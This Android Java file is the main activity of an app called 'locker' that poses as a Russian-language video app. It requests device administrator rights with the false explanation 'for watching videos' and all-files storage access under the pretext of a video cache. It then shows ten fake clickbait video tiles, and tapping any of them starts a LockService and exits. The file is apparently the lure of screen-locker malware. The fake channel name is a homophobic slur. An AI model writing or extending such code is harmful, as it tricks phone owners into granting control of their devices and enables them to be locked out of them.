package com.locker;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.view.View;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int ADMIN_INTENT = 1;

    @Override 
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        checkPermissions();
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkPermissions();
    }

    private void checkPermissions() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);

        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Для просмотра видео");
            startActivityForResult(intent, ADMIN_INTENT);
            return;
        }

        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            Toast.makeText(this, "Нужен доступ к памяти для кэша видео", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
            return;
        }

        generateVideos();
    }

    private void generateVideos() {
        LinearLayout list = findViewById(R.id.videoList);
        list.removeAllViews(); 

        String[] titles = {
            "Как взломать Пентагон за 5 минут",
            "СМОТРЕТЬ ДО КОНЦА! ШОК!",
            "Секретные кадры из будущего",
            "Мой новый ПК за 3.000.000 рублей",
            "Готовим пиццу из носков",
            "ТОП 10 САМЫХ СТРАШНЫХ ИГР",
            "Пранк над другом (ЖЕСТЬ)",
            "Как выйти из матрицы",
            "Секреты Windows 11, о которых молчат",
            "ПОЧЕМУ ТЕЛЕФОН ГРЕЕТСЯ?"
        };

        for (int i = 0; i < 10; i++) {
            LinearLayout videoView = new LinearLayout(this);
            videoView.setOrientation(LinearLayout.VERTICAL);
            videoView.setPadding(15, 15, 15, 15);
            
            ImageView thumb = new ImageView(this);
            thumb.setImageResource(R.drawable.yt_thumb); 
            thumb.setScaleType(ImageView.ScaleType.CENTER_CROP);
            LinearLayout.LayoutParams thumbParams = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT, 400);
            thumb.setLayoutParams(thumbParams);
            videoView.addView(thumb);

            TextView title = new TextView(this);
            title.setText(titles[i]);
            title.setTextColor(0xFFFFFFFF);
            title.setTextSize(16);
            title.setPadding(0, 10, 0, 10);
            videoView.addView(title);

            TextView author = new TextView(this);
            author.setText("Хакер Группировка Pidori • 1 млн просмотров");
            author.setTextColor(0xFFAAAAAA);
            author.setTextSize(12);
            videoView.addView(author);

            videoView.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    startService(new Intent(MainActivity.this, LockService.class));
                    finish();
                }
            });

            list.addView(videoView);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == ADMIN_INTENT) {
            checkPermissions();
        }
    }
                                   }
